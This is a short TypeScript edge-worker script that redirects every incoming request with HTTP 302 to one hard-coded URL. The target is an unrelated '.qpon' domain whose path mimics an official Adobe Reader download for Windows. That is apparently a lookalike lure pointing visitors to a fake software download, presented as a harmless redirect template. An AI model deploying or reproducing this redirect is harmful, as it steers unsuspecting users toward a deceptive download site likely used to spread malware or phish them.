// redirect.ts

// Define the redirect URL
const redirectUrl = "https://ligelyu.qpon/get.adobe.com-reader-download-os-Windows-10name-Reader+2025.001.20630+English+Windows"; // Replace with the URL you want to redirect to

// Handle the request
addEventListener("fetch", (event) => {
  event.respondWith(
    new Response(null, {
      status: 302, // HTTP status for redirection
      headers: {
        "Location": redirectUrl, // The URL to redirect to
      },
    })
  );
});
